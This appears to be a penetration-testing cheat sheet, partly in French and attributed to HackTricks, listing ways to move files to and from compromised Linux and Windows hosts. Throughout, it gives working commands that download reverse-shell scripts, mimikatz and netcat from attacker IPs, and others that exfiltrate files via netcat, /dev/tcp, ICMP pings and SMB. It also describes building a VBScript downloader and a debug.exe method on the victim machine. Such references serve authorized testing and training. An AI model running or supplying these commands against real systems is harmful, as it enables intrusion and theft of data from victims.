============
EXFILTRATION
============

**Source** : https://book.hacktricks.xyz/exfiltration

Copy&Paste Base64
=================

-----
Linux
-----

.. code-block:: bash
  :linenos:

  base64 -w0 <file> #Encode file
  base64 -d file #Decode file

-------
Windows
-------
.. code-block:: bash
  :linenos:

  certutil -encode payload.dll payload.b64
  certutil -decode payload.b64 payload.dll

HTTP
====

-----
Linux
-----
.. code-block:: bash
  :linenos:

  wget 10.10.14.14:8000/tcp_pty_backconnect.py -O /dev/shm/.rev.py
  wget 10.10.14.14:8000/tcp_pty_backconnect.py -P /dev/shm
  curl 10.10.14.14:8000/shell.py -o /dev/shm/shell.py
  fetch 10.10.14.14:8000/shell.py #FreeBSD

-------
Windows
-------
.. code-block:: bash
  :linenos:

  certutil -urlcache -split -f http://webserver/payload.b64 payload.b64
  bitsadmin /transfer transfName /priority high http://example.com/examplefile.pdf C:\downloads\examplefile.pdf
  ​
  #PS
  (New-Object Net.WebClient).DownloadFile("http://10.10.14.2:80/taskkill.exe","C:\Windows\Temp\taskkill.exe")
  Invoke-WebRequest "http://10.10.14.2:80/taskkill.exe" -OutFile "taskkill.exe"
  wget "http://10.10.14.2/nc.bat.exe" -OutFile "C:\ProgramData\unifivideo\taskkill.exe"
  ​
  Import-Module BitsTransfer
  Start-BitsTransfer -Source $url -Destination $output
  #OR
  Start-BitsTransfer -Source $url -Destination $output -Asynchronous

------------
Upload files
------------

**Lien :** https://gist.github.com/UniIsland/3346170
​

------------
HTTPS Server
------------

.. code-block:: bash
  :linenos:

  # from https://gist.github.com/dergachev/7028596
  # taken from http://www.piware.de/2011/01/creating-an-https-server-in-python/
  # generate server.xml with the following command:
  #    openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
  # run as follows:
  #    python simple-https-server.py
  # then in your browser, visit:
  #    https://localhost:443
  ​
  import BaseHTTPServer, SimpleHTTPServer
  import ssl
  ​
  httpd = BaseHTTPServer.HTTPServer(('0.0.0.0', 443), SimpleHTTPServer.SimpleHTTPRequestHandler)
  httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True)
  httpd.serve_forever()

FTP
===

-------------------
FTP server (python)
-------------------

.. code-block:: bash
  :linenos:

  pip3 install pyftpdlib
  python3 -m pyftpdlib -p 21

-------------------
FTP server (NodeJS)
-------------------

.. code-block:: bash
  :linenos:

  sudo npm install -g ftp-srv --save
  ftp-srv ftp://0.0.0.0:9876 --root /tmp

---------------------
FTP server (pure-ftp)
---------------------

``apt-get update && apt-get install pure-ftp``

.. code-block:: bash
  :linenos:

  #Run the following script to configure the FTP server
  #!/bin/bash
  groupadd ftpgroup
  useradd -g ftpgroup -d /dev/null -s /etc ftpuser
  pure-pwd useradd fusr -u ftpuser -d /ftphome
  pure-pw mkdb
  cd /etc/pure-ftpd/auth/
  ln -s ../conf/PureDB 60pdb
  mkdir -p /ftphome
  chown -R ftpuser:ftpgroup /ftphome/
  /etc/init.d/pure-ftpd restart

--------------
Windows client
--------------

.. code-block:: bash
  :linenos:

  #Work well with python. With pure-ftp use fusr:ftp
  echo open 10.11.0.41 21 > ftp.txt
  echo USER anonymous >> ftp.txt
  echo anonymous >> ftp.txt
  echo bin >> ftp.txt
  echo GET mimikatz.exe >> ftp.txt
  echo bye >> ftp.txt
  ftp -n -v -s:ftp.txt

SMB
===

Kali as server

.. code-block:: bash
  :linenos:

  kali_op1> impacket-smbserver -smb2support kali `pwd` # Share current directory
  kali_op2> smbserver.py -smb2support name /path/folder # Share a folder
  #For new Win10 versions
  impacket-smbserver -smb2support -user test -password test test `pwd`

Or create a **smb** share using samba:

.. code-block:: bash
  :linenos:

  apt-get install samba
  mkdir /tmp/smb
  chmod 777 /tmp/smb
  #Add to the end of /etc/samba/smb.conf this:
  [public]
      comment = Samba on Ubuntu
      path = /tmp/smb
      read only = no
      browsable = yes
      guest ok = Yes
  #Start samba
  service smbd restart

Windows

.. code-block:: bash
  :linenos:

  CMD-Wind> \\10.10.14.14\path\to\exe
  CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentials

.. code-block:: bash
  :linenos:

  WindPS-1> New-PSDrive -Name "new_disk" -PSProvider "FileSystem" -Root "\\10.10.14.9\kali"
  WindPS-2> cd new_disk:

SCP
===

The attacker has to have SSHd running.

``scp <username>@<Attacker_IP>:<directory>/<filename>`` 

NC
===

.. code-block:: bash
  :linenos:

  nc -lvnp 4444 > new_file
  nc -vn <IP> 4444 < exfil_file


/dev/tcp
========

-------------------------
Download file from victim
-------------------------

.. code-block:: bash
  :linenos:

  nc -lvnp 80 > file #Inside attacker
  cat /path/file > /dev/tcp/10.10.10.10/80 #Inside victim

---------------------
Upload file to victim
---------------------

.. code-block:: bash
  :linenos:

  nc -w5 -lvnp 80 < file_to_send.txt # Inside attacker
  # Inside victim
  exec 6< /dev/tcp/10.10.10.10/4444
  cat <&6 > file.txt

Merci à **@BinaryShadow_**

ICMP
====

.. code-block:: bash
  :linenos:

  #In order to exfiltrate the content of a file via pings you can do:
  xxd -p -c 4 /path/file/exfil | while read line; do ping -c 1 -p $line <IP attacker>; done
  #This will 4bytes per ping packet (you could probably increase this until 16)

.. code-block:: bash
  :linenos:

  from scapy.all import *
  #This is ippsec receiver created in the HTB machine Mischief
  def process_packet(pkt):
      if pkt.haslayer(ICMP):
          if pkt[ICMP].type == 0:
              data = pkt[ICMP].load[-4:] #Read the 4bytes interesting
              print(f"{data.decode('utf-8')}", flush=True, end="")
  ​
  sniff(iface="tun0", prn=process_packet)

SMTP
====

Si vous pouvez envoyer des données à un serveur SMTP, vous pouvez créer un SMTP pour recevoir les données avec python:

``sudo python -m smtpd -n -c DebuggingServer :25``

TFTP
=====
.. note:: Par défaut dans XP et 2003 (dans d'autres, il doit être explicitement ajouté lors de l'installation).

Dans Kali, démarrez le serveur TFTP :

.. code-block:: bash
  :linenos:

  #I didn't get this options working and I prefer the python option
  mkdir /tftp
  atftpd --daemon --port 69 /tftp
  cp /path/tp/nc.exe /tftp
  TFTP server in python:
  pip install ptftpd
  ptftpd -p 69 tap0 . # ptftp -p <PORT> <IFACE> <FOLDER>
  In victim, connect to the Kali server:
  tftp -i <KALI-IP> get nc.exe

PHP
===
Téléchargez un fichier avec un oneliner PHP :

``echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php``

VBScript
========

``Attacker> python -m SimpleHTTPServer 80``

**Victim**

.. code-block:: bash
  :linenos:

  echo strUrl = WScript.Arguments.Item(0) > wget.vbs
  echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
  echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
  echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
  echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
  echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
  echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
  echo Err.Clear >> wget.vbs
  echo Set http = Nothing >> wget.vbs
  echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
  echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
  echo If http Is Nothing Then Set http =CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
  echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
  echo http.Open "GET", strURL, False >> wget.vbs
  echo http.Send >> wget.vbs
  echo varByteArray = http.ResponseBody >> wget.vbs
  echo Set http = Nothing >> wget.vbs
  echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
  echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
  echo strData = "" >> wget.vbs
  echo strBuffer = "" >> wget.vbs
  echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
  echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
  echo Next >> wget.vbs
  echo ts.Close >> wget.vbs

``cscript wget.vbs http://10.11.0.5/evil.exe evil.exe``

Debug.exe
=========

.. note::  C'est une technique folle qui fonctionne sur les machines Windows 32 bits. Fondamentalement, l'idée est d'utiliser le programme debug.exe. Il est utilisé pour inspecter les binaires, comme un débogueur. Mais il peut aussi les reconstruire à partir des hex. Donc, l'idée est que nous prenons un binaire, comme netcat.Et puis désassemblez-le en hexadécimaux, collez-le dans un fichier sur la machine compromise, puis assemblez-le avec debug.exe. Déboguer.exe ne peut assembler que 64 Ko. Nous devons donc utiliser des fichiers plus petits que cela. Nous pouvons utiliser upx pour le compresser encore plus. 
 
Alors faisons-le :

``upx -9 nc.exe``

Maintenant, il ne pèse que 29 kb. Parfait. Alors maintenant, démontons-le:

``wine exe2bat.exe nc.exe nc.txt``

Maintenant, nous ne faisons que copier-coller le texte dans notre shell Windows. Et il créera automatiquement un fichier appelé nc.exe

DNS
===

https://github.com/62726164/dns-exfil